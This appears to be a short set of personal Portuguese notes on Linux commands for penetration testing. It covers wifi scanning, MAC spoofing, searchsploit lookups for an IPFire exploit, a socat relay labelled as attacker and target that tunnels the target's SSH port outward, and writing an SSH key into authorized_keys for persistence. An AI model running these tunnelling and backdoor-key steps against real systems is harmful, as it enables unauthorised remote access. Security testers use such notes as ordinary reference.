# Comandos Linux



# Wifi no terminal

- sudo iwconfig  // dispositivos wifi
- sudo iwlist wlan0 scan  // listando redes wifi 
- sudo iwlist wllan0 scan | grep ESSID  // listando redes wifi, filtrando apenas nomes
- nmcli d wifi connect SSIDredeWifi password suasenha // conecta na rede wifi

- macchanger -r eth0
- macchanger -p eth0
- macchanger -m mac eth0

- ipcalc 192.168.1.1/255.255.255.0
-------------
- searchsploit "ipfire" --exclude="algum|outra"
- searchsploit -e "ipfire"
- searchsploit "ipfire" --id
- searchsploit "ipfire" --id -m 44433
- searchsploit "ipfire" -m 44433.py
-------------
- socat TCP-LISTEN:8443,reuseaddr,fork TCP-LISTEN:2222,reuseaddr    #ouvindo atacante
- socat TCP4:172.20.1.6:8443 TCP4:127.0.0.1:22                      #maquina alvo
-----------
- ssh-keygen -f minhachave #criando chave publica ssh
- mkdir ~www-data
- mkdir ~/.ssh/
- touch ~/.ssh/authorized_keys
- echo "key ssh-rsa" > ~/.ssh/authorized_keys
- -----------------
